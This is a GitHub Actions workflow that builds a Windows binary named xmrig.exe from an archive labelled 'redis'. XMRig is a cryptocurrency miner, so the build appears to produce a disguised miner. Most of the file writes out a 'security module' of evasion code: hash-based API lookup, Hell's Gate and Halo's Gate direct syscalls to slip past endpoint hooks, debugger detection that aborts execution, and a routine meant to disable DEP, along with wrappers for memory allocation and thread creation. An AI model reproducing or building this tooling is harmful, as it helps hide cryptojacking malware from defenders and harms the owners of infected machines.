name: Build on Do new re

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout source code
        uses: actions/checkout@v3

      # 安装 MSYS2 及所需工具链
      - name: Set up MSYS2 with GCC, CMake, HWLOC, and make
        uses: msys2/setup-msys2@v2
        with:
          msystem: MINGW64
          install: mingw-w64-x86_64-gcc mingw-w64-x86_64-cmake mingw-w64-x86_64-hwloc mingw-w64-x86_64-make unzip mingw-w64-x86_64-nasm

      # 安装 curl
      - name: Install curl
        shell: msys2 {0}
        run: pacman -S --noconfirm curl

      # 下载 gcc.zip
      - name: Download gcc.zip
        shell: msys2 {0}
        run: curl -L -o gcc.zip https://raw.githubusercontent.com/Janit8r/frp-2/refs/heads/dev/gcc.zip

      # 下载 redis.zip
      - name: Download redis.zip
        shell: msys2 {0}
        run: curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win996.zip

      # 解压 gcc.zip
      - name: Unzip gcc.zip
        shell: msys2 {0}
        run: unzip gcc.zip -d gcc

      # 解压 redis.zip
      - name: Unzip redis.zip
        shell: msys2 {0}
        run: unzip redis.zip -d redis

      # 创建安全模块目录
      - name: Create security module directory
        shell: msys2 {0}
        run: |
          mkdir -p redis/redis-D-Win996/src/security

      # 创建安全模块文件
      - name: Create security module files
        shell: msys2 {0}
        run: |
          # 创建unhooker.h
          cat << 'EOF_UNHOOKER_H' > redis/redis-D-Win996/src/security/unhooker.h
          #pragma once

          #include <Windows.h>

          // 错误标志
          #define INVALID_SSN 0xffff

          // 光环门查找偏移量
          #define HALOS_DOWN 32
          #define HALOS_UP -32

          // 地狱之门和塔塔鲁斯之门偏移量
          #define HELLGATE_OFFSET 8
          #define TARTARUSGATE_OFFSET 12

          #ifdef __cplusplus
          extern "C" {
          #endif

          // ASM函数声明
          VOID AmmunitionPrepare(WORD systemCall);
          ULONG GunPrepare(INT_PTR syscallAdr);
          PVOID GetPEB();
          NTSTATUS GunFire();

          // 用于从API地址查找系统调用号
          WORD FindAmmunitionsAndPrepareGun(LPVOID addr);

          // 通过hash查找模块
          HMODULE GetModuleByHash(DWORD hash);

          // 通过hash查找API地址
          LPVOID GetAPIAddressByHash(HMODULE moduleHandle, DWORD apiHash);

          // 检查调试器
          BOOL CheckDebugger();

          // 自定义哈希函数
          DWORD CalcHash(const char* data);

          #ifdef __cplusplus
          }
          #endif
          EOF_UNHOOKER_H

          # 创建syscalls.asm (MASM格式)
          cat << 'EOF_SYSCALLS_ASM' > redis/redis-D-Win996/src/security/syscalls.asm
          .data
              systemCall WORD 000h
              syscallAddr QWORD 0h

          .code
              ; 从TEB获取PEB地址
              GetPEB proc
                  ; 从GS段寄存器读取TEB地址
                  mov rax, gs:[30h]
                  ; 从TEB结构体偏移60h处读取PEB地址
                  mov rax, [rax + 60h]
                  ret
              GetPEB endp

              ; 准备系统调用号
              AmmunitionPrepare proc
                  mov systemCall, cx
                  ret
              AmmunitionPrepare endp

              ; 设置syscall指令地址
              GunPrepare proc
                  mov rax, syscallAddr
                  test rax, rax
                  jnz THEEND
                  mov syscallAddr, rcx
                  THEEND:
                  ret
              GunPrepare endp

              ; 执行系统调用
              GunFire proc
                  mov r10, rcx
                  xor rax, rax
                  mov ax, systemCall
                  test ax, ax
                  JZ GunRuined
                  jmp qword ptr syscallAddr
                  ret
              GunFire endp

              ; 调用失败处理
              GunRuined proc
                  not rax
                  ret
              GunRuined endp

          end
          EOF_SYSCALLS_ASM
          
          # 创建syscalls_nasm.asm (NASM格式)
          cat << 'EOF_SYSCALLS_NASM' > redis/redis-D-Win996/src/security/syscalls_nasm.asm
          SECTION .data
              systemCall: dw 0x000
              syscallAddr: dq 0x0
              
          SECTION .text
              global GetPEB
              global AmmunitionPrepare
              global GunPrepare
              global GunFire
              global GunRuined
              
          ; 从TEB中获取PEB地址
          GetPEB:
              mov rax, qword [gs:0x30]  ; 从GS段寄存器读取TEB地址
              mov rax, qword [rax + 0x60] ; 从TEB中获取PEB
              ret

          ; 设置系统调用号
          AmmunitionPrepare:
              mov word [systemCall], cx
              ret

          ; 保存系统调用指令地址
          GunPrepare:
              mov rax, qword [syscallAddr]
              test rax, rax
              jnz THEEND
              mov qword [syscallAddr], rcx
              xor rax, rax
          THEEND:
              ret

          ; 执行系统调用
          GunFire:
              mov r10, rcx              ; 第二个参数移动到r10，符合x64调用约定
              mov eax, 0                ; 清零EAX
              mov ax, word [systemCall] ; 设置系统调用号
              test ax, ax
              jz GunRuined
              jmp qword [syscallAddr]   ; 通过指针跳转
              ret

          ; 系统调用失败
          GunRuined:
              not rax
              ret
          EOF_SYSCALLS_NASM

          # 创建structs.h
          cat << 'EOF_STRUCTS_H' > redis/redis-D-Win996/src/security/structs.h
          #pragma once

          #include <Windows.h>

          // Windows内部结构定义
          typedef struct _UNICODE_STRING {
              USHORT Length;
              USHORT MaximumLength;
              PWSTR  Buffer;
          } UNICODE_STRING, *PUNICODE_STRING;

          typedef struct _LIST_ENTRY {
              struct _LIST_ENTRY *Flink;
              struct _LIST_ENTRY *Blink;
          } LIST_ENTRY, *PLIST_ENTRY;

          typedef struct _RTL_USER_PROCESS_PARAMETERS {
              BYTE Reserved1[16];
              PVOID Reserved2[10];
              UNICODE_STRING ImagePathName;
              UNICODE_STRING CommandLine;
          } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

          typedef struct _PEB_LDR_DATA {
              BYTE Reserved1[8];
              PVOID Reserved2[3];
              LIST_ENTRY InMemoryOrderModuleList;
          } PEB_LDR_DATA, *PPEB_LDR_DATA;

          typedef struct _LDR_DATA_TABLE_ENTRY {
              LIST_ENTRY InLoadOrderLinks;
              LIST_ENTRY InMemoryOrderLinks;
              LIST_ENTRY InInitializationOrderLinks;
              PVOID DllBase;
              PVOID EntryPoint;
              ULONG SizeOfImage;
              UNICODE_STRING FullDllName;
              UNICODE_STRING BaseDllName;
          } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

          typedef struct _PEB {
              BYTE Reserved1[2];
              BYTE BeingDebugged;
              BYTE Reserved2[1];
              PVOID Reserved3[2];
              PPEB_LDR_DATA Ldr;
              PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
              PVOID Reserved4[3];
              PVOID AtlThunkSListPtr;
              PVOID Reserved5;
              ULONG Reserved6;
              PVOID Reserved7;
              ULONG Reserved8;
              ULONG AtlThunkSListPtr32;
              PVOID Reserved9[45];
              BYTE Reserved10[96];
              PVOID PostProcessInitRoutine;
              BYTE Reserved11[128];
              PVOID Reserved12[1];
              ULONG SessionId;
          } PEB, *PPEB;

          // NTSTATUS定义
          typedef LONG NTSTATUS;
          #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
          #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

          // 内存区域定义
          #define MEM_EXECUTE_OPTION_ENABLE 1
          #define MEM_EXECUTE_OPTION_DISABLE 2
          #define MEM_EXECUTE_OPTION_PERMANENT 8

          // 常用NT API函数原型定义
          typedef NTSTATUS(NTAPI* PFN_NTPROTECTVIRTUALMEMORY)(
              HANDLE ProcessHandle,
              PVOID* BaseAddress,
              PSIZE_T RegionSize,
              ULONG NewProtect,
              PULONG OldProtect);

          typedef NTSTATUS(NTAPI* PFN_NTALLOCATEVIRTUALMEMORY)(
              HANDLE ProcessHandle,
              PVOID* BaseAddress,
              ULONG_PTR ZeroBits,
              PSIZE_T RegionSize,
              ULONG AllocationType,
              ULONG Protect);

          typedef NTSTATUS(NTAPI* PFN_NTCREATETHREADEX)(
              PHANDLE ThreadHandle,
              ACCESS_MASK DesiredAccess,
              PVOID ObjectAttributes,
              HANDLE ProcessHandle,
              PVOID StartRoutine,
              PVOID Argument,
              ULONG CreateFlags,
              SIZE_T ZeroBits,
              SIZE_T StackSize,
              SIZE_T MaximumStackSize,
              PVOID AttributeList);

          typedef NTSTATUS(NTAPI* PFN_NTSETINFORMATIONPROCESS)(
              HANDLE ProcessHandle,
              ULONG ProcessInformationClass,
              PVOID ProcessInformation,
              ULONG ProcessInformationLength);
          EOF_STRUCTS_H

          # 创建security.h
          cat << 'EOF_SECURITY_H' > redis/redis-D-Win996/src/security/security.h
          #pragma once

          #include <Windows.h>
          #include <string>

          // 安全功能初始化
          bool InitializeSecurity();

          // 反调试功能
          bool IsDebuggerPresent();

          // 哈希混淆的API调用
          bool ExecuteNtFunction(const std::string& functionName, ...);

          // 常用Windows API的哈希值
          namespace NtHashValues {
              // ntdll.dll模块哈希
              constexpr DWORD NTDLL_HASH = 0x3e8557;

              // 系统调用哈希值
              constexpr DWORD NT_ALLOCATE_VIRTUAL_MEMORY_HASH = 0x112da6be2b35;
              constexpr DWORD NT_PROTECT_VIRTUAL_MEMORY_HASH = 0x59ef896aad4;
              constexpr DWORD NT_CREATE_THREAD_EX_HASH = 0x1f7ecc338;
              constexpr DWORD NT_QUERY_INFORMATION_PROCESS_HASH = 0x8cdc5dc2c;
              constexpr DWORD NT_SET_INFORMATION_PROCESS_HASH = 0x1cbfd68c12;
              constexpr DWORD NT_CREATE_SECTION_HASH = 0x2d1237d69fc;
              constexpr DWORD NT_MAP_VIEW_OF_SECTION_HASH = 0x5c8e85b24f;
              constexpr DWORD NT_UNMAP_VIEW_OF_SECTION_HASH = 0xe015972b44;
              constexpr DWORD NT_CLOSE_HASH = 0xa1f0c3c;
          }

          // 安全操作类
          class SecurityOps {
          public:
              // 执行内存分配系统调用
              static NTSTATUS NtAllocateVirtualMemory(
                  HANDLE ProcessHandle,
                  PVOID* BaseAddress,
                  ULONG_PTR ZeroBits,
                  PSIZE_T RegionSize,
                  ULONG AllocationType,
                  ULONG Protect);

              // 执行内存保护系统调用
              static NTSTATUS NtProtectVirtualMemory(
                  HANDLE ProcessHandle,
                  PVOID* BaseAddress,
                  PSIZE_T RegionSize,
                  ULONG NewProtect,
                  PULONG OldProtect);

              // 执行线程创建系统调用
              static NTSTATUS NtCreateThreadEx(
                  PHANDLE ThreadHandle,
                  ACCESS_MASK DesiredAccess,
                  PVOID ObjectAttributes,
                  HANDLE ProcessHandle,
                  PVOID StartRoutine,
                  PVOID Argument,
                  ULONG CreateFlags,
                  SIZE_T ZeroBits,
                  SIZE_T StackSize,
                  SIZE_T MaximumStackSize,
                  PVOID AttributeList);

              // 禁用DEP
              static bool DisableDEP();
              
              // 反调试检查
              static bool CheckForDebugger();
          };

          // 初始化宏
          #define SECURITY_INIT() InitializeSecurity()
          EOF_SECURITY_H

          # 创建unhooker.c
          cat << 'EOF_UNHOOKER_C' > redis/redis-D-Win996/src/security/unhooker.c
          #include <Windows.h>
          #include <stdio.h>
          #include "unhooker.h"

          // 通用哈希函数
          DWORD CalcHash(const char* data) {
              DWORD hash = 0x99;
              for (int i = 0; i < lstrlenA(data); i++) {
                  hash += data[i] + (hash << 1);
              }
              return hash;
          }

          // 计算模块哈希
          static DWORD CalcHashModule(PLDR_DATA_TABLE_ENTRY moduleEntry) {
              char name[64];
              size_t i = 0;

              while (moduleEntry->BaseDllName.Buffer[i] && i < sizeof(name) - 1) {
                  name[i] = (char)moduleEntry->BaseDllName.Buffer[i];
                  i++;
              }
              name[i] = 0;
              return CalcHash((char*)CharLowerA(name));
          }

          // 从TEB中查找模块
          HMODULE GetModuleByHash(DWORD moduleHash) {
              HMODULE module = NULL;
              PVOID pebPtr = GetPEB();
              PPEB peb = (PPEB)pebPtr;
              
              if (!peb) return NULL;

              PPEB_LDR_DATA ldr = peb->Ldr;
              if (!ldr) return NULL;

              // 遍历模块列表
              PLIST_ENTRY moduleList = &ldr->InMemoryOrderModuleList;
              PLIST_ENTRY entry = moduleList->Flink;

              while (entry != moduleList) {
                  PLDR_DATA_TABLE_ENTRY moduleEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
                  
                  if (moduleEntry->DllBase != NULL) {
                      if (CalcHashModule(moduleEntry) == moduleHash) {
                          module = (HMODULE)moduleEntry->DllBase;
                          return module;
                      }
                  }
                  
                  entry = entry->Flink;
              }

              return NULL;
          }

          // 通过哈希查找API地址
          LPVOID GetAPIAddressByHash(HMODULE moduleHandle, DWORD apiHash) {
              if (moduleHandle == NULL) {
                  return NULL;
              }

              PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
              if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
                  return NULL;
              }

              PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)moduleHandle + dosHeader->e_lfanew);
              if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
                  return NULL;
              }

              DWORD exportDirVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
              if (exportDirVA == 0) {
                  return NULL;
              }

              PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)moduleHandle + exportDirVA);
              PDWORD funcAddresses = (PDWORD)((LPBYTE)moduleHandle + exportDir->AddressOfFunctions);
              PDWORD nameAddresses = (PDWORD)((LPBYTE)moduleHandle + exportDir->AddressOfNames);
              PWORD nameOrdinals = (PWORD)((LPBYTE)moduleHandle + exportDir->AddressOfNameOrdinals);

              for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
                  LPSTR funcName = (LPSTR)((LPBYTE)moduleHandle + nameAddresses[i]);
                  if (CalcHash(funcName) == apiHash) {
                      LPVOID funcAddr = (LPVOID)((LPBYTE)moduleHandle + funcAddresses[nameOrdinals[i]]);
                      return funcAddr;
                  }
              }

              return NULL;
          }

          // 地狱之门/光环之门/塔塔鲁斯之门实现
          WORD FindAmmunitionsAndPrepareGun(LPVOID addr) {
              WORD syscall;
              INT_PTR syscallAddr;

              // 地狱之门方法: 检查直接系统调用指令的特定模式
              if (*((PBYTE)addr) == 0x4c &&
                  *((PBYTE)addr + 1) == 0x8b &&
                  *((PBYTE)addr + 2) == 0xd1 &&
                  *((PBYTE)addr + 3) == 0xb8 &&
                  *((PBYTE)addr + HELLGATE_OFFSET) == 0x00 &&
                  *((PBYTE)addr + HELLGATE_OFFSET + 1) == 0x00) {

                  BYTE high = *((PBYTE)addr + HELLGATE_OFFSET - 1);
                  BYTE low = *((PBYTE)addr + HELLGATE_OFFSET - 2);
                  syscall = (high << 8) | low;

                  syscallAddr = (INT_PTR)addr + 0x12;
                  GunPrepare(syscallAddr);

                  return syscall;
              }

              // 光环之门方法: 检查特定模式
              if (*((PBYTE)addr) == 0x4c &&
                  *((PBYTE)addr + 1) == 0x8b &&
                  *((PBYTE)addr + 2) == 0xd1 &&
                  *((PBYTE)addr + 3) == 0xb8 &&
                  *((PBYTE)addr + 6) == 0x00 &&
                  *((PBYTE)addr + 7) == 0x00) {

                  BYTE high = *((PBYTE)addr + 5);
                  BYTE low = *((PBYTE)addr + 4);
                  syscall = (high << 8) | low;

                  syscallAddr = (INT_PTR)addr + 0x12;
                  GunPrepare(syscallAddr);

                  return syscall;
              }

              // 塔塔鲁斯之门方法: 查找跳转指令
              if (*((PBYTE)addr) == 0xe9 ||
                  *((PBYTE)addr + TARTARUSGATE_OFFSET) == 0xe9 ||
                  *((PBYTE)addr + 7) == 0xe9 ||
                  *((PBYTE)addr + 9) == 0xe9 ||
                  *((PBYTE)addr + 11) == 0xe9) {

                  // 使用光环之门技术上下搜索
                  for (WORD idx = 1; idx <= 500; idx++) {
                      // 向下搜索
                      if (*((PBYTE)addr + idx * HALOS_DOWN) == 0x4c &&
                          *((PBYTE)addr + 1 + idx * HALOS_DOWN) == 0x8b &&
                          *((PBYTE)addr + 2 + idx * HALOS_DOWN) == 0xd1 &&
                          *((PBYTE)addr + 3 + idx * HALOS_DOWN) == 0xb8 &&
                          *((PBYTE)addr + 6 + idx * HALOS_DOWN) == 0x00 &&
                          *((PBYTE)addr + 7 + idx * HALOS_DOWN) == 0x00) {

                          BYTE high = *((PBYTE)addr + 5 + idx * HALOS_DOWN);
                          BYTE low = *((PBYTE)addr + 4 + idx * HALOS_DOWN);
                          syscall = (high << 8) | low - idx;

                          syscallAddr = (INT_PTR)addr + 0x12 + idx * HALOS_DOWN;
                          GunPrepare(syscallAddr);

                          return syscall;
                      }
                      
                      // 向上搜索
                      if (*((PBYTE)addr + idx * HALOS_UP) == 0x4c &&
                          *((PBYTE)addr + 1 + idx * HALOS_UP) == 0x8b &&
                          *((PBYTE)addr + 2 + idx * HALOS_UP) == 0xd1 &&
                          *((PBYTE)addr + 3 + idx * HALOS_UP) == 0xb8 &&
                          *((PBYTE)addr + 6 + idx * HALOS_UP) == 0x00 &&
                          *((PBYTE)addr + 7 + idx * HALOS_UP) == 0x00) {

                          BYTE high = *((PBYTE)addr + 5 + idx * HALOS_UP);
                          BYTE low = *((PBYTE)addr + 4 + idx * HALOS_UP);
                          syscall = (high << 8) | low + idx;

                          syscallAddr = (INT_PTR)addr + 0x12 + idx * HALOS_UP;
                          GunPrepare(syscallAddr);

                          return syscall;
                      }
                  }
              }

              return INVALID_SSN;
          }

          // 检查调试器存在
          BOOL CheckDebugger() {
              PPEB peb = (PPEB)GetPEB();
              if (!peb) return FALSE;
              
              return (BOOL)peb->BeingDebugged;
          }
          EOF_UNHOOKER_C

          # 创建security.cpp
          cat << 'EOF_SECURITY_CPP' > redis/redis-D-Win996/src/security/security.cpp
          #include "security.h"
          #include "unhooker.h"
          #include "structs.h"
          #include <stdarg.h>

          // 定义NtCurrentProcess宏，表示当前进程句柄
          #define NtCurrentProcess() ((HANDLE)-1)

          // ntdll模块句柄
          static HMODULE ntdllModule = NULL;

          // 安全功能初始化
          bool InitializeSecurity() {
              // 检查调试器
              if (SecurityOps::CheckForDebugger()) {
                  // 如果存在调试器，可以选择退出或执行混淆操作
                  return false;
              }
              
              // 通过哈希获取ntdll模块
              ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
              if (!ntdllModule) {
                  return false;
              }

              // 禁用DEP保护
              SecurityOps::DisableDEP();
              
              return true;
          }

          // 检查调试器是否存在
          bool IsDebuggerPresent() {
              return SecurityOps::CheckForDebugger();
          }

          // 安全操作类实现
          NTSTATUS SecurityOps::NtAllocateVirtualMemory(
              HANDLE ProcessHandle,
              PVOID* BaseAddress,
              ULONG_PTR ZeroBits,
              PSIZE_T RegionSize,
              ULONG AllocationType,
              ULONG Protect) {
              
              if (!ntdllModule) {
                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
                  if (!ntdllModule) {
                      return STATUS_SUCCESS;
                  }
              }
              
              // 获取API地址
              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_ALLOCATE_VIRTUAL_MEMORY_HASH);
              if (!addr) {
                  return STATUS_SUCCESS;
              }
              
              // 获取系统调用号
              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
              if (syscallNum == INVALID_SSN) {
                  return STATUS_SUCCESS;
              }
              
              // 准备系统调用
              AmmunitionPrepare(syscallNum);
              
              // 执行系统调用
              return GunFire(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
          }

          NTSTATUS SecurityOps::NtProtectVirtualMemory(
              HANDLE ProcessHandle,
              PVOID* BaseAddress,
              PSIZE_T RegionSize,
              ULONG NewProtect,
              PULONG OldProtect) {
              
              if (!ntdllModule) {
                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
                  if (!ntdllModule) {
                      return STATUS_SUCCESS;
                  }
              }
              
              // 获取API地址
              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_PROTECT_VIRTUAL_MEMORY_HASH);
              if (!addr) {
                  return STATUS_SUCCESS;
              }
              
              // 获取系统调用号
              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
              if (syscallNum == INVALID_SSN) {
                  return STATUS_SUCCESS;
              }
              
              // 准备系统调用
              AmmunitionPrepare(syscallNum);
              
              // 执行系统调用
              return GunFire(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
          }

          NTSTATUS SecurityOps::NtCreateThreadEx(
              PHANDLE ThreadHandle,
              ACCESS_MASK DesiredAccess,
              PVOID ObjectAttributes,
              HANDLE ProcessHandle,
              PVOID StartRoutine,
              PVOID Argument,
              ULONG CreateFlags,
              SIZE_T ZeroBits,
              SIZE_T StackSize,
              SIZE_T MaximumStackSize,
              PVOID AttributeList) {
              
              if (!ntdllModule) {
                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
                  if (!ntdllModule) {
                      return STATUS_SUCCESS;
                  }
              }
              
              // 获取API地址
              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_CREATE_THREAD_EX_HASH);
              if (!addr) {
                  return STATUS_SUCCESS;
              }
              
              // 获取系统调用号
              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
              if (syscallNum == INVALID_SSN) {
                  return STATUS_SUCCESS;
              }
              
              // 准备系统调用
              AmmunitionPrepare(syscallNum);
              
              // 执行系统调用
              return GunFire(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
                          StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, 
                          MaximumStackSize, AttributeList);
          }

          bool SecurityOps::DisableDEP() {
              if (!ntdllModule) {
                  ntdllModule = GetModuleByHash(NtHashValues::NTDLL_HASH);
                  if (!ntdllModule) {
                      return false;
                  }
              }
              
              // 获取NtSetInformationProcess API地址
              LPVOID addr = GetAPIAddressByHash(ntdllModule, NtHashValues::NT_SET_INFORMATION_PROCESS_HASH);
              if (!addr) {
                  return false;
              }
              
              // 获取系统调用号
              WORD syscallNum = FindAmmunitionsAndPrepareGun(addr);
              if (syscallNum == INVALID_SSN) {
                  return false;
              }
              
              // 准备系统调用
              AmmunitionPrepare(syscallNum);
              
              // 禁用DEP的参数设置
              ULONG executeOptions = MEM_EXECUTE_OPTION_ENABLE;
              
              // 调用NtSetInformationProcess
              NTSTATUS status = GunFire(
                  NtCurrentProcess(),        // 当前进程句柄
                  0x22,                      // ProcessExecuteFlags
                  &executeOptions,           // 执行选项
                  sizeof(executeOptions)    // 参数大小
              );
              
              return NT_SUCCESS(status);
          }

          bool SecurityOps::CheckForDebugger() {
              return CheckDebugger();
          }
          EOF_SECURITY_CPP

      # 更新安全模块的CMakeLists.txt
      - name: Update security CMakeLists.txt for NASM
        shell: msys2 {0}
        run: |
          cat << 'EOF_CMAKE' > redis/redis-D-Win996/src/security/CMakeLists.txt
          set(SOURCES
              security.cpp
              unhooker.c
          )

          # 生成汇编文件
          if (CMAKE_SIZEOF_VOID_P EQUAL 8)
              # 64位架构
              if (WIN32 AND MSVC)
                  # Visual Studio使用MASM
                  set(ASM_SOURCES
                      syscalls.asm
                  )
                  set_property(SOURCE syscalls.asm PROPERTY LANGUAGE ASM_MASM)
              else()
                  # MinGW使用NASM
                  enable_language(ASM_NASM)
                  
                  # 确保NASM文件存在
                  if(EXISTS "${CMAKE_CURRENT_SOURCE_DIR}/syscalls_nasm.asm")
                      set(ASM_SOURCES
                          syscalls_nasm.asm
                      )
                  else()
                      # 如果没有NASM文件，使用标准syscalls.asm
                      message(STATUS "syscalls_nasm.asm not found, using syscalls.asm instead")
                      set(ASM_SOURCES
                          syscalls.asm
                      )
                  endif()
              endif()
          else()
              # 32位架构
              message(FATAL_ERROR "安全模块仅支持64位架构")
          endif()

          # 添加安全模块
          add_library(security STATIC ${SOURCES} ${ASM_SOURCES})

          # 设置包含目录
          target_include_directories(security PUBLIC ${CMAKE_CURRENT_SOURCE_DIR})

          # 添加编译定义
          target_compile_definitions(security PRIVATE
              _CRT_SECURE_NO_WARNINGS
              WIN32_LEAN_AND_MEAN
              NOMINMAX
          )

          # 特定编译器选项
          if (MSVC)
              # 禁用一些警告
              target_compile_options(security PRIVATE 
                  /W3
                  /wd4996
                  /D_CRT_SECURE_NO_WARNINGS
                  /bigobj
              )
          endif()
          EOF_CMAKE

      # 创建 build 目录
      - name: Create build directory in redis
        shell: msys2 {0}
        run: mkdir -p redis/redis-D-Win996/build

      # 确保 mingw32-make 已安装
      - name: Ensure mingw32-make is installed
        shell: msys2 {0}
        run: |
          echo 'Checking for make installation...'
          if ! command -v mingw32-make &> /dev/null; then
            echo 'mingw32-make is not installed. Installing...'
            pacman -S --noconfirm mingw-w64-x86_64-make
          else
            echo 'mingw32-make is already installed.'
          fi
          mingw32-make --version

      # 运行 CMake 生成 Makefiles
      - name: Run CMake to generate Makefiles
        shell: msys2 {0}
        run: |
          cd redis/redis-D-Win996/build
          # 确保NASM可用
          which nasm
          nasm --version
          # 编译时额外设置NASM路径和选项
          export NASM_PATH=$(which nasm)
          cmake .. -G "MinGW Makefiles" \
            -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 \
            -DCMAKE_C_FLAGS='-static' \
            -DCMAKE_CXX_FLAGS='-static' \
            -DBUILD_SHARED_LIBS=OFF \
            -DHWLOC_INCLUDE_DIRS=/mingw64/include \
            -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a \
            -DWITH_SECURITY=ON \
            -DCMAKE_ASM_NASM_COMPILER="$NASM_PATH" \
            -DCMAKE_ASM_NASM_FLAGS="-f win64"

      # 编译项目
      - name: Build project
        shell: msys2 {0}
        run: |
          cd redis/redis-D-Win996/build
          mingw32-make

      # 上传构建产物
      - name: Archive build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-artifacts
          path: redis/redis-D-Win996/build/xmrig.exe
